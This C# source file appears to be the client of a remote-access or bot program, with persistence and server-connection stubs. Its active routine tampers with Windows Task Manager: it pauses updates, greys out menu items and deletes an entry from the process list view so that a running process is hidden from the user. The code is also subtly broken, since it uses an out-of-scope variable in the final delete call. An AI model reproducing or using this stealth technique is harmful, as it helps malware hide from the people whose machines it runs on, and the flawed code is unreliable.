using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using Client.API;

namespace Client
{
    class Program
    {
        private static  Persistence  _Persistence = new Persistence();
        private static  LocalMachine _ThisPC = new LocalMachine();
        private static  Server       _Server = new Server();

        static void Main(string[] args)
        {
            Init();
            CheckMachineStates();

            HideProcess();

            //DKOM.ProcessChain = System.Diagnostics.Process.GetProcesses().ToList();
            //var result = DKOM.FindWindow(null, "Untitled - Notepad");


            Console.WriteLine("--");

           /* do
            {
                // If we are offline.
                while (_ThisPC.Status == LocalMachine.State.OFFLINE)
                {
                    _ThisPC.Reconnect();
                }

                // If we are online, but the server is unreachable.
                while (_Server.Status == Server.State.OFFLINE && _ThisPC.Status == LocalMachine.State.ONLINE)
                {
                    _Server.Probe();
                }

                while (_ThisPC.Status == LocalMachine.State.ONLINE && _Server.Status == Server.State.ONLINE)
                {
                    CheckMachineStates();
                    Start();
                }

                Thread.Sleep(1000);
            } while (true);
        */}

        private static void Init()
        {
            // Set predefined config here.
            Logger.IsEnabled = true;

            string logging = Logger.IsEnabled ? "ON" : "OFF";
            Console.WriteLine("[{0}] Logging\n", logging);
 
        }

        private static void Start()
        {
        }

        private static void CheckMachineStates()
        {
            _ThisPC.Reconnect();
            _Server.Probe();
        }

        private static void HideProcess()
        {
            IntPtr lhWndParent = DKOM.FindWindow(null, "Task Manager");
            Console.WriteLine("Handle:\t" + lhWndParent + " - " + lhWndParent.ToString("X"));

            IntPtr lhTaskManagerMain = new IntPtr(),
                   lhDirectUIHWND = new IntPtr(),
                   lhSysListView32 = new IntPtr(),
                   lhSysHeader32 = new IntPtr();

            // Get Task manager menus
            IntPtr hMenu = DKOM.GetMenu(lhWndParent);
            IntPtr hSubMenu = DKOM.GetSubMenu(hMenu, 2);
            IntPtr hSubSubMenu = DKOM.GetSubMenu(hSubMenu, 1);
            
            // Refresh now button
            Int32 refreshNowButton = DKOM.GetMenuItemID(hSubMenu, 0);

            // Menu items
            List<Int32> updateNowList = new List<int>()
            {
                DKOM.GetMenuItemID(hSubSubMenu, 0),
                DKOM.GetMenuItemID(hSubSubMenu, 1),
                DKOM.GetMenuItemID(hSubSubMenu, 2),
                DKOM.GetMenuItemID(hSubSubMenu, 3)
            };

            
            //Force clicking of the pause
            DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, updateNowList[3] , 0);

            foreach (Int32 button in updateNowList)
            {
                DKOM.EnableMenuItem(hMenu, (uint)button, DKOM.MF_GRAYED);
            }
            DKOM.EnableMenuItem(hMenu, (uint)refreshNowButton, DKOM.MF_ENABLED);

            // Start working our way down the UI classes to the listview
            lhTaskManagerMain = DKOM.FindWindowEx(lhWndParent, lhTaskManagerMain, null, null);
            lhDirectUIHWND = DKOM.FindWindowEx(lhTaskManagerMain, lhDirectUIHWND, null, null);

            // Step through the task manager inner windows looking for the process lists
            for (int i = 0; i < 7; i++)
            {
                lhSysListView32 = DKOM.FindWindowEx(lhDirectUIHWND, lhSysListView32, null , null);
                Console.WriteLine("Searching class: " + lhSysListView32.ToString("X"));
                
                if (DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                {
                    Console.WriteLine(" ^ HIT.");
                    lhSysListView32 = DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null);
                    lhSysHeader32 = DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysHeader32", null);
                    break;
                }
            }

            DKOM.LockWindowUpdate(lhSysListView32);
            


            DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, refreshNowButton, 0); //Refresh
            DKOM.PostMessage(lhSysListView32, DKOM.LVM_SORTITEMS, 0, 0);         //Sort
            DKOM.PostMessage(lhSysListView32, DKOM.LVM_DELETEITEM, i, 0);        //Delete
          
            
            DKOM.LockWindowUpdate(IntPtr.Zero);

          
            

       }

    }
}
